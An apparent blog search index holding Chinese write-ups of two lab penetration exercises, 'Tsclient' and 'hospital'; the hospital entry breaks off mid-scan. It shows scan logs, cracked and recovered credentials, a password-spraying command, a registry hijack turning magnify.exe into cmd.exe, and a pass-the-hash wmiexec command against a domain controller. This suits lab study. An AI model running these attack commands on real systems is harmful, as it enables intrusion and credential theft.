<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>春秋云镜之Tsclient</title>
    <link href="/2025/08/31/Tsclient/"/>
    <url>/2025/08/31/Tsclient/</url>
    
    <content type="html"><![CDATA[<h1 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h1><p>先扫一下</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs MATLAB">D:\天狐工具箱\gui_scan\fscan&gt;fscan.exe -h <span class="hljs-number">39.99</span><span class="hljs-number">.153</span><span class="hljs-number">.41</span><br><br>   ___                              _<br>  / _ \     ___  ___ _ __ __ _  ___| | __<br> / /_\/____/ __|/ __| <span class="hljs-string">&#x27;__/ _` |/ __| |/ /</span><br><span class="hljs-string">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;</span><br><span class="hljs-string">\____/     |___/\___|_|  \__,_|\___|_|\_\</span><br><span class="hljs-string">                     fscan version: 2.0.0</span><br><span class="hljs-string">[*] 扫描类型: all, 目标端口: 21,22,80,81,135,139,443,445,1433,1521,3306,5432,6379,7001,8000,8080,8089,9000,9200,11211,27017,80,81,82,83,84,85,86,87,88,89,90,91,92,98,99,443,800,801,808,880,888,889,1000,1010,1080,1081,1082,1099,1118,1888,2008,2020,2100,2375,2379,3000,3008,3128,3505,5555,6080,6648,6868,7000,7001,7002,7003,7004,7005,7007,7008,7070,7071,7074,7078,7080,7088,7200,7680,7687,7688,7777,7890,8000,8001,8002,8003,8004,8006,8008,8009,8010,8011,8012,8016,8018,8020,8028,8030,8038,8042,8044,8046,8048,8053,8060,8069,8070,8080,8081,8082,8083,8084,8085,8086,8087,8088,8089,8090,8091,8092,8093,8094,8095,8096,8097,8098,8099,8100,8101,8108,8118,8161,8172,8180,8181,8200,8222,8244,8258,8280,8288,8300,8360,8443,8448,8484,8800,8834,8838,8848,8858,8868,8879,8880,8881,8888,8899,8983,8989,9000,9001,9002,9008,9010,9043,9060,9080,9081,9082,9083,9084,9085,9086,9087,9088,9089,9090,9091,9092,9093,9094,9095,9096,9097,9098,9099,9100,9200,9443,9448,9800,9981,9986,9988,9998,9999,10000,10001,10002,10004,10008,10010,10250,12018,12443,14000,16080,18000,18001,18002,18004,18008,18080,18082,18088,18090,18098,19001,20000,20720,21000,21501,21502,28018,20880</span><br><span class="hljs-string">[*] 开始信息扫描...</span><br><span class="hljs-string">[*] 最终有效主机数量: 1</span><br><span class="hljs-string">[*] 共解析 218 个有效端口</span><br><span class="hljs-string">[+] 端口开放 39.99.153.41:135</span><br><span class="hljs-string">[+] 端口开放 39.99.153.41:80</span><br><span class="hljs-string">[+] 端口开放 39.99.153.41:139</span><br><span class="hljs-string">[+] 端口开放 39.99.153.41:1433</span><br><span class="hljs-string">[+] 存活端口数量: 4</span><br><span class="hljs-string">[*] 开始漏洞扫描...</span><br><span class="hljs-string">[*] 网站标题 http://39.99.153.41       状态码:200 长度:703    标题:IIS Windows Server</span><br><span class="hljs-string">[*] NetInfo</span><br><span class="hljs-string">[*] 39.99.153.41</span><br><span class="hljs-string">   [-&gt;] WIN-WEB</span><br><span class="hljs-string">   [-&gt;] 172.22.8.18</span><br><span class="hljs-string">   [-&gt;] 2001:0:348b:fb58:3cf4:1774:d89c:66d6</span><br><span class="hljs-string">[!] 扫描错误 39.99.153.41:139 - netbios error</span><br><span class="hljs-string">[+] MSSQL 39.99.153.41:1433:sa 1qaz!QAZ</span><br><span class="hljs-string">[+] 扫描已完成: 4/4</span><br><span class="hljs-string">[*] 扫描结束,耗时: 15.6297851s</span><br></code></pre></td></tr></table></figure><p>sa 1qaz!QAZ 发现账号密码</p><p>mdut直接连接</p><p><img src="/../Tsclient/1756632361696-21.png" alt="img"></p><p>尝试上传土豆提高权限到sysytem</p><p><img src="/../Tsclient/1756632361677-1.png" alt="img"></p><p>传cs马</p><p><img src="/../Tsclient/1756632361677-2.png" alt="img"></p><p>甜土豆上线system用户</p><p><img src="/../Tsclient/1756632361677-3.png" alt="img"></p><p>拿到第一个flag</p><h1 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h1><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs MATLAB">C:\Users\Public\FScan_2<span class="hljs-number">.0</span><span class="hljs-number">.1</span>_windows_x64.exe.exe -h <span class="hljs-number">172.22</span><span class="hljs-number">.8</span><span class="hljs-number">.18</span>/<span class="hljs-number">24</span> <br>┌──────────────────────────────────────────────┐<br>│    ___                              _        │<br>│   / _ \     ___  ___ _ __ __ _  ___| | __    │<br>│  / /_\/____/ __|/ __| <span class="hljs-string">&#x27;__/ _` |/ __| |/ /    │</span><br><span class="hljs-string">│ / /_\\_____\__ \ (__| | | (_| | (__|   &lt;     │</span><br><span class="hljs-string">│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │</span><br><span class="hljs-string">└──────────────────────────────────────────────┘</span><br><span class="hljs-string">      Fscan Version: 2.0.1</span><br><span class="hljs-string"></span><br><span class="hljs-string">[2.2s]     已选择服务扫描模式</span><br><span class="hljs-string">[2.2s]     开始信息扫描</span><br><span class="hljs-string">[2.2s]     CIDR范围: 172.22.8.0-172.22.8.255</span><br><span class="hljs-string">[2.2s]     generate_ip_range_full</span><br><span class="hljs-string">[2.2s]     解析CIDR 172.22.8.18/24 -&gt; IP范围 172.22.8.0-172.22.8.255</span><br><span class="hljs-string">[2.2s]     最终有效主机数量: 256</span><br><span class="hljs-string">[2.2s]     开始主机扫描</span><br><span class="hljs-string">[2.2s]     使用服务插件: activemq, cassandra, elasticsearch, findnet, ftp, imap, kafka, ldap, memcached, modbus, mongodb, ms17010, mssql, mysql, neo4j, netbios, oracle, pop3, postgres, rabbitmq, rdp, redis, rsync, smb, smb2, smbghost, smtp, snmp, ssh, telnet, vnc, webpoc, webtitle</span><br><span class="hljs-string">[2.2s] [*] 目标 172.22.8.15     存活 (ICMP)</span><br><span class="hljs-string">[2.2s] [*] 目标 172.22.8.18     存活 (ICMP)</span><br><span class="hljs-string">[2.2s] [*] 目标 172.22.8.31     存活 (ICMP)</span><br><span class="hljs-string">[2.2s] [*] 目标 172.22.8.46     存活 (ICMP)                                       C:\Users\Public\fscan.exe -h 172.22.8.18/24[5.2s]     存活主机数量: 424 </span><br><span class="hljs-string">[5.2s]     有效端口数量: 233</span><br><span class="hljs-string">[5.2s] [*] 端口开放 172.22.8.15:445</span><br><span class="hljs-string">[5.2s] [*] 端口开放 172.22.8.15:389</span><br><span class="hljs-string">[5.2s] [*] 端口开放 172.22.8.15:139</span><br><span class="hljs-string">[5.2s] [*] 端口开放 172.22.8.31:135</span><br><span class="hljs-string">[5.2s] [*] 端口开放 172.22.8.18:1433</span><br><span class="hljs-string">[5.2s] [*] 端口开放 172.22.8.15:135</span><br><span class="hljs-string">[5.2s] [*] 端口开放 172.22.8.18:445</span><br><span class="hljs-string">[5.2s] [*] 端口开放 172.22.8.15:88</span><br><span class="hljs-string">[5.2s] [*] 端口开放 172.22.8.31:445</span><br><span class="hljs-string">[5.2s] [*] 端口开放 172.22.8.31:139</span><br><span class="hljs-string">[5.2s] [*] 端口开放 172.22.8.18:135</span><br><span class="hljs-string">[5.2s] [*] 端口开放 172.22.8.18:139</span><br><span class="hljs-string">[5.2s] [*] 端口开放 172.22.8.18:80                       C:\Users\Public\fscan.exe -h 172.22.8.18/24[6.2s] [*] 端口开放 172.22.8.46:445</span><br><span class="hljs-string">[6.2s] [*] 端口开放 172.22.8.46:139</span><br><span class="hljs-string">[6.2s] [*] 端口开放 172.22.8.46:135</span><br><span class="hljs-string">[6.2s] [*] 端口开放 172.22.8.46:80                 C:\Users\Public\FScan_2.0.1_windows_x64.exe.exe -h 172.22.8.18/24 [9.3s]     扫描完成, 发现 17 个开放端口</span><br><span class="hljs-string">[9.3s]     存活端口数量: 17</span><br><span class="hljs-string">[9.3s]     开始漏洞扫描</span><br><span class="hljs-string">[9.3s] [*] NetInfo 扫描结果</span><br><span class="hljs-string">目标主机: 172.22.8.18</span><br><span class="hljs-string">主机名: WIN-WEB</span><br><span class="hljs-string">发现的网络接口:</span><br><span class="hljs-string">   IPv4地址:</span><br><span class="hljs-string">      └─ 172.22.8.18</span><br><span class="hljs-string">   IPv6地址:</span><br><span class="hljs-string">      └─ 2001:0:348b:fb58:20d1:213:d89c:7db3</span><br><span class="hljs-string">[9.3s] [*] NetInfo 扫描结果</span><br><span class="hljs-string">目标主机: 172.22.8.31</span><br><span class="hljs-string">主机名: WIN19-CLIENT</span><br><span class="hljs-string">发现的网络接口:</span><br><span class="hljs-string">   IPv4地址:</span><br><span class="hljs-string">      └─ 172.22.8.31</span><br><span class="hljs-string">[9.3s] [*] NetInfo 扫描结果</span><br><span class="hljs-string">目标主机: 172.22.8.15</span><br><span class="hljs-string">主机名: DC01</span><br><span class="hljs-string">发现的网络接口:</span><br><span class="hljs-string">   IPv4地址:</span><br><span class="hljs-string">      └─ 172.22.8.15</span><br><span class="hljs-string">[9.3s] [*] NetInfo 扫描结果</span><br><span class="hljs-string">目标主机: 172.22.8.46</span><br><span class="hljs-string">主机名: WIN2016</span><br><span class="hljs-string">发现的网络接口:</span><br><span class="hljs-string">   IPv4地址:</span><br><span class="hljs-string">      └─ 172.22.8.46</span><br><span class="hljs-string">[9.3s] [*] 网站标题 http://172.22.8.18        状态码:200 长度:703    标题:IIS Windows Server</span><br><span class="hljs-string">[9.3s] [+] NetBios 172.22.8.31     XIAORANG\WIN19-CLIENT         </span><br><span class="hljs-string">[9.3s] [+] NetBios 172.22.8.15     DC:XIAORANG\DC01           </span><br><span class="hljs-string">[9.3s] [+] NetBios 172.22.8.46     WIN2016.xiaorang.lab                Windows Server 2016 Datacenter 14393</span><br><span class="hljs-string">[9.4s]     POC加载完成: 总共387个，成功387个，失败0个</span><br><span class="hljs-string">[9.4s] [*] 网站标题 http://172.22.8.46        状态码:200 长度:703    标题:IIS Windows Server</span><br><span class="hljs-string">[16.4s] [+C:\Users\Public\fscan.exe -h 172.22.8.18/24</span><br></code></pre></td></tr></table></figure><p>内网扫一遍</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs MATLAB">net user<br></code></pre></td></tr></table></figure><p>发现有一个john用户</p><p><img src="/../Tsclient/1756632361678-4.png" alt="img"></p><p>注入让john用户上线</p><p><img src="/../Tsclient/1756632361678-5.png" alt="img"></p><p>挂载</p><p><img src="/../Tsclient/1756632361678-6.png" alt="img"></p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs MATLAB">xiaorang.lab\Aldrich:Ald@rLMWuy7Z!#<br>proxychains4 crackmapexec smb <span class="hljs-number">172.22</span><span class="hljs-number">.8</span><span class="hljs-number">.0</span>/<span class="hljs-number">24</span> -u <span class="hljs-string">&#x27;Aldrich&#x27;</span> -p <span class="hljs-string">&#x27;Ald@rLMWuy7Z!#&#x27;</span> -d xiaorang.lab <span class="hljs-number">2</span>&gt;/dev/null<br></code></pre></td></tr></table></figure><p><img src="/../Tsclient/1756632361678-7.png" alt="img"></p><p><img src="/../Tsclient/1756632361678-8.png" alt="img"></p><p>修改密码成功</p><p><img src="/../Tsclient/1756632361678-9.png" alt="img"></p><p>登录46成功（注意代理</p><p><img src="/../Tsclient/1756632361678-10.png" alt="img"></p><p>可以修改注册表</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs MATLAB">reg add <span class="hljs-string">&quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe&quot;</span> /v Debugger /t REG_SZ /d <span class="hljs-string">&quot;C:\Windows\System32\cmd.exe&quot;</span><br></code></pre></td></tr></table></figure><p>劫持cmd</p><p><img src="/../Tsclient/1756632361678-11.png" alt="img"></p><p>在锁定的放大镜的地方拿到system权限</p><p><img src="/../Tsclient/1756632361678-12.png" alt="img"></p><p><img src="/../Tsclient/1756632361678-13.png" alt="img"></p><p>传转发入口机流量的转发上线监听器，让46机子的system上线了</p><p><img src="/../Tsclient/1756632361678-14.png" alt="img"></p><p><img src="/../Tsclient/1756632361678-15.png" alt="img"></p><p>拿到flag2</p><h1 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h1><p>查看域的信息</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs MATLAB">shell net group <span class="hljs-string">&quot;domain admins&quot;</span> /domain<br></code></pre></td></tr></table></figure><p><img src="/../Tsclient/1756632361678-16.png" alt="img"></p><p>发现本机是域管理员</p><p>点击抓取本机明文密码，然后查看hash值</p><p><img src="/../Tsclient/1756632361678-17.png" alt="img"></p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs MATLAB"><span class="hljs-number">83</span>d29a49096bf96d0ca1e1e5531fb65b<br>proxychains4 python wmiexec.py -hashes :<span class="hljs-number">83</span>d29a49096bf96d0ca1e1e5531fb65b xiaorang.lab/WIN2016\$@<span class="hljs-number">172.22</span><span class="hljs-number">.8</span><span class="hljs-number">.15</span> -codec gbk<br></code></pre></td></tr></table></figure><p><img src="/../Tsclient/1756632361678-18.png" alt="img"></p><p>拿到shell之后读文件</p><p><img src="/../Tsclient/1756632361679-19.png" alt="img"></p><p><img src="/../Tsclient/1756632361679-20.png" alt="img"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结:"></a>总结:</h1><p>整理一下思路:首先是入口机（18号机）存在一个mssql的弱口令登录，直接用mdut工具登录后拿到一个低权限的shell，然后用甜土豆提权到system。然后传cs马，利用甜土豆触发cs马，让system上线cs，得到一个稳定持久的权限，方便进行后续的渗透。</p><p>然后是net user发现了一个john用户，通过进程注入，使其上线cs，发现存在一个挂载的文件夹，里面发现了一对域的账密，通过crackmapexec的密码喷洒去连接内网的机子，利用smbpassword修改密码,登录上46号机，发现权限不够，同时为了维护权限，利用18号机子的可以监听到46号机子的特性，传了一个流量转发上线的cs马，然后打了一个镜像劫持，修改注册表，让放大镜变成cmd，在锁定在状态下获得了system权限，同时46号机子的system上线cs。</p><p>46号机子是域管理员，利用它的哈希可以拿到DC，15号机子的shell，最后读flag就好了</p>]]></content>
    
    
    <categories>
      
      <category>渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>春秋云镜之hospital</title>
    <link href="/2025/08/20/hospital/"/>
    <url>/2025/08/20/hospital/</url>
    
    <content type="html"><![CDATA[<h3 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h3><p>fscan扫描</p><p><img src="/../hospital/1756616305171-10.png" alt="img"></p><p>存在actuator泄露</p><p><img src="/../hospital/1756616305162-1.png" alt="img"></p><p>下载下来，然后解密</p><p><img src="/../hospital/1756616305162-2.png" alt="img"></p><p>然后利用密钥注入内存马</p><p><img src="/../hospital/1756616305163-3.png" alt="img"></p><h3 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><code class="hljs Bash">fscan -h 172.30.12.5/24<br><br>   ___                              _    <br>  / _ \     ___  ___ _ __ __ _  ___| | __ <br> / /_\/____/ __|/ __| <span class="hljs-string">&#x27;__/ _` |/ __| |/ /</span><br><span class="hljs-string">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    </span><br><span class="hljs-string">\____/     |___/\___|_|  \__,_|\___|_|\_\   </span><br><span class="hljs-string">                     fscan version: 1.8.4</span><br><span class="hljs-string">start infoscan</span><br><span class="hljs-string">(icmp) Target 172.30.12.5     is alive</span><br><span class="hljs-string">(icmp) Target 172.30.12.6     is alive</span><br><span class="hljs-string">(icmp) Target 172.30.12.236   is alive</span><br><span class="hljs-string">[*] Icmp alive hosts len is: 3</span><br><span class="hljs-string">172.30.12.6:445 open</span><br><span class="hljs-string">172.30.12.6:139 open</span><br><span class="hljs-string">172.30.12.236:22 open</span><br><span class="hljs-string">172.30.12.5:22 open</span><br><span class="hljs-string">172.30.12.6:8848 open</span><br><span class="hljs-string">172.30.12.236:8080 open</span><br><span class="hljs-string">172.30.12.5:8080 open</span><br><span class="hljs-string">172.30.12.6:135 open</span><br><span class="hljs-string">172.30.12.236:8009 open</span><br><span class="hljs-string">[*] alive ports len is: 9</span><br><span class="hljs-string">start vulscan</span><br><span class="hljs-string">[*] NetBios 172.30.12.6     WORKGROUP\SERVER02            </span><br><span class="hljs-string">[*] NetInfo </span><br><span class="hljs-string">[*]172.30.12.6</span><br><span class="hljs-string">   [-&gt;]Server02</span><br><span class="hljs-string">   [-&gt;]172.30.12.6</span><br><span class="hljs-string">[*] WebTitle http://172.30.12.5:8080   code:302 len:0      title:None 跳转url: http://172.30.12.5:8080/login;jsessionid=2261EB3268EC9362C18EA7EAD68503FD</span><br><span class="hljs-string">[*] WebTitle http://172.30.12.5:8080/login;jsessionid=2261EB3268EC9362C18EA7EAD68503FD code:200 len:2005   title:医疗管理后台</span><br><span class="hljs-string">[*] WebTitle http://172.30.12.236:8080 code:200 len:3964   title:医院后台管理平台</span><br><span class="hljs-string">[*] WebTitle http://172.30.12.6:8848   code:404 len:431    title:HTTP Status 404 – Not Found</span><br><span class="hljs-string">[+] PocScan http://172.30.12.5:8080 poc-yaml-spring-actuator-heapdump-file </span><br><span class="hljs-string">[+] PocScan http://172.30.12.6:8848 poc-yaml-alibaba-nacos </span><br><span class="hljs-string">[+] PocScan http://172.30.12.6:8848 poc-yaml-alibaba-nacos-v1-auth-bypass </span><br><span class="hljs-string">root@web01:~# ./fscan -h 172.30.12.5</span><br><span class="hljs-string">┌──────────────────────────────────────────────┐</span><br><span class="hljs-string">│    ___                              _        │</span><br><span class="hljs-string">│   / _ \     ___  ___ _ __ __ _  ___| | __    │</span><br><span class="hljs-string">│  / /_\/____/ __|/ __| &#x27;</span>__/ _` |/ __| |/ /    │<br>│ / /_\\_____\__ \ (__| | | (_| | (__|   &lt;     │<br>│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │<br>└──────────────────────────────────────────────┘<br>      Fscan Version: 2.0.0<br><br>[2025-08-04 23:36:02] [INFO] 暴力破解线程数: 1<br>[2025-08-04 23:36:02] [INFO] 开始信息扫描<br>[2025-08-04 23:36:02] [INFO] 最终有效主机数量: 1<br>[2025-08-04 23:36:02] [INFO] 开始主机扫描<br>[2025-08-04 23:36:02] [INFO] 有效端口数量: 233<br>[2025-08-04 23:36:02] [SUCCESS] 端口开放 172.30.12.5:8080<br>[2025-08-04 23:36:02] [SUCCESS] 端口开放 172.30.12.5:22<br>[2025-08-04 23:36:02] [SUCCESS] 服务识别 172.30.12.5:22 =&gt; [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.9 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.9.]<br>[2025-08-04 23:36:07] [SUCCESS] 服务识别 172.30.12.5:8080 =&gt; [http]<br>[2025-08-04 23:36:07] [INFO] 存活端口数量: 2<br>[2025-08-04 23:36:07] [INFO] 开始漏洞扫描<br>[2025-08-04 23:36:07] [INFO] 加载的插件: ssh, webpoc, webtitle<br>[2025-08-04 23:36:08] [SUCCESS] 网站标题 http://172.30.12.5:8080   状态码:302 长度:0      标题:无标题 重定向地址: http://172.30.12.5:8080/login;jsessionid=3B63A3BF0F71CA4D7EAF33C45987584E<br>[2025-08-04 23:36:08] [SUCCESS] 网站标题 http://172.30.12.5:8080/login;jsessionid=3B63A3BF0F71CA4D7EAF33C45987584E 状态码:200 长度:2005   标题:医疗管理后台<br>[2025-08-04 23:36:08] [SUCCESS] 目标: http://172.30.12.5:8080<br>  漏洞类型: poc-yaml-spring-actuator-heapdump-file<br>  漏洞名称: <br>  详细信息:<br>        author:AgeloVito<br>        links:https://www.cnblogs.com/wyb628/p/8567610.html<br>^C<br>root@web01:~# ./fscan -h 172.30.12.5/24<br>┌──────────────────────────────────────────────┐<br>│    ___                              _        │<br>│   / _ \     ___  ___ _ __ __ _  ___| | __    │<br>│  / /_\/____/ __|/ __| <span class="hljs-string">&#x27;__/ _` |/ __| |/ /    │</span><br><span class="hljs-string">│ / /_\\_____\__ \ (__| | | (_| | (__|   &lt;     │</span><br><span class="hljs-string">│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │</span><br><span class="hljs-string">└──────────────────────────────────────────────┘</span><br><span class="hljs-string">      Fscan Version: 2.0.0</span><br><span class="hljs-string"></span><br><span class="hljs-string">[2025-08-04 23:41:24] [INFO] 暴力破解线程数: 1</span><br><span class="hljs-string">[2025-08-04 23:41:24] [INFO] 开始信息扫描</span><br><span class="hljs-string">[2025-08-04 23:41:24] [INFO] CIDR范围: 172.30.12.0-172.30.12.255</span><br><span class="hljs-string">[2025-08-04 23:41:24] [INFO] 生成IP范围: 172.30.12.0.%!d(string=172.30.12.255) - %!s(MISSING).%!d(MISSING)</span><br><span class="hljs-string">[2025-08-04 23:41:24] [INFO] 解析CIDR 172.30.12.5/24 -&gt; IP范围 172.30.12.0-172.30.12.255</span><br><span class="hljs-string">[2025-08-04 23:41:24] [INFO] 最终有效主机数量: 256</span><br><span class="hljs-string">[2025-08-04 23:41:24] [INFO] 开始主机扫描</span><br><span class="hljs-string">[2025-08-04 23:41:24] [SUCCESS] 目标 172.30.12.5     存活 (ICMP)</span><br><span class="hljs-string">[2025-08-04 23:41:24] [SUCCESS] 目标 172.30.12.6     存活 (ICMP)</span><br><span class="hljs-string">[2025-08-04 23:41:24] [SUCCESS] 目标 172.30.12.236   存活 (ICMP)</span><br><span class="hljs-string">[2025-08-04 23:41:27] [INFO] 存活主机数量: 3</span><br><span class="hljs-string">[2025-08-04 23:41:27] [INFO] 有效端口数量: 233</span><br><span class="hljs-string">[2025-08-04 23:41:27] [SUCCESS] 端口开放 172.30.12.236:22</span><br><span class="hljs-string">[2025-08-04 23:41:27] [SUCCESS] 端口开放 172.30.12.6:445</span><br><span class="hljs-string">[2025-08-04 23:41:27] [SUCCESS] 端口开放 172.30.12.6:139</span><br><span class="hljs-string">[2025-08-04 23:41:27] [SUCCESS] 端口开放 172.30.12.5:22</span><br><span class="hljs-string">[2025-08-04 23:41:27] [SUCCESS] 端口开放 172.30.12.6:135</span><br><span class="hljs-string">[2025-08-04 23:41:27] [SUCCESS] 端口开放 172.30.12.236:8009</span><br><span class="hljs-string">[2025-08-04 23:41:27] [SUCCESS] 端口开放 172.30.12.5:8080</span><br><span class="hljs-string">[2025-08-04 23:41:27] [SUCCESS] 端口开放 172.30.12.236:8080</span><br><span class="hljs-string">[2025-08-04 23:41:27] [SUCCESS] 端口开放 172.30.12.6:8848</span><br><span class="hljs-string">[2025-08-04 23:41:27] [SUCCESS] 服务识别 172.30.12.236:22 =&gt; [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.9 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.9.]</span><br><span class="hljs-string">[2025-08-04 23:41:27] [SUCCESS] 服务识别 172.30.12.5:22 =&gt; [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.9 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.9.]</span><br><span class="hljs-string">[2025-08-04 23:41:32] [SUCCESS] 服务识别 172.30.12.6:445 =&gt; </span><br><span class="hljs-string">[2025-08-04 23:41:32] [SUCCESS] 服务识别 172.30.12.6:139 =&gt;  Banner:[.]</span><br><span class="hljs-string">[2025-08-04 23:41:32] [SUCCESS] 服务识别 172.30.12.236:8009 =&gt; </span><br><span class="hljs-string">[2025-08-04 23:41:33] [SUCCESS] 服务识别 172.30.12.5:8080 =&gt; [http]</span><br><span class="hljs-string">[2025-08-04 23:41:33] [SUCCESS] 服务识别 172.30.12.236:8080 =&gt; [http]</span><br><span class="hljs-string">[2025-08-04 23:41:38] [SUCCESS] 服务识别 172.30.12.6:8848 =&gt; [http]</span><br><span class="hljs-string">[2025-08-04 23:42:32] [SUCCESS] 